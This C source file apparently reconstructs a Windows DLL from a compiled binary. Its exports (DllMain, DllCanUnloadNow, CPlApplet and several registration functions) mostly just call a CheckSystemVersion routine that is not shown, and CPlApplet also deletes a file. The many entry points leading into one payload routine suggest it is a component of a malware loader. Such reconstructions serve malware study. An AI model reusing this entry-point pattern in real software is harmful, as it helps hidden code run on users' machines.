/******************************************************************************************
  Copyright (C) 2012-2014 Christian Roggia <christian.roggia@gmail.com>

   Licensed under the Apache License, Version 2.0 (the "License");
   you may not use this file except in compliance with the License.
   You may obtain a copy of the License at

       http://www.apache.org/licenses/LICENSE-2.0

   Unless required by applicable law or agreed to in writing, software
   distributed under the License is distributed on an "AS IS" BASIS,
   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
   See the License for the specific language governing permissions and
   limitations under the License.
******************************************************************************************/

#include "3. OS.h"
#include "config.h"
#include "StdAfx.h"

HINSTANCE g_hInstDLL = NULL;

// 100% (C) CODE MATCH
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
{
	DEBUG_P("DllMain called")
	
	if(fdwReason && fdwReason == 1)
		g_hInstDLL = hinstDLL;
	
	return TRUE;
}

// 100% (C) CODE MATCH
BOOL WINAPI DllUnregisterServerEx(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
{
	DEBUG_P("DllUnregisterServerEx called")
	
	if(fdwReason && fdwReason == 1)
	{
		g_hInstDLL = hinstDLL;
		CheckSystemVersion(TRUE);
	}
	
	return FALSE;
}

// 100% (C) CODE MATCH
STDAPI APIENTRY DllCanUnloadNow(void)
{
	DEBUG_P("DllCanUnloadNow called")
	
	g_hInstDLL = GetModuleHandleW(0);
	CheckSystemVersion(TRUE);
	
	ExitProcess(0);
}

// 100% (C) CODE MATCH
STDAPI APIENTRY DllGetClassObject(const IID *const rclsid, const IID *const riid, LPVOID *ppv)
{
	DEBUG_P("DllGetClassObject called")
	
	CheckSystemVersion(TRUE);
}

// 100% (C) CODE MATCH
STDAPI APIENTRY DllRegisterServerEx(void)
{
	DEBUG_P("DllRegisterServerEx called")
	
	CheckSystemVersion(TRUE);
	return 1;
}

// 100% (C) CODE MATCH
LONG WINAPI CPlApplet(HWND hwndCPl, UINT uMsg, LPARAM lParam1, LPARAM lParam2)
{
	DEBUG_P("CPlApplet called")
	
	if(*(DWORD *)(hwndCPl + 2))
		DeleteFileA(*(LPCSTR *)(hwndCPl + 2));
	
	CheckSystemVersion(TRUE);
	return 1;
}

// 100% (C) CODE MATCH
STDAPI APIENTRY DllGetClassObjectEx(int a1, int a2, int a3, int a4)
{
	DEBUG_P("DllGetClassObjectEx called")
	
	CheckSystemVersion(FALSE);
}
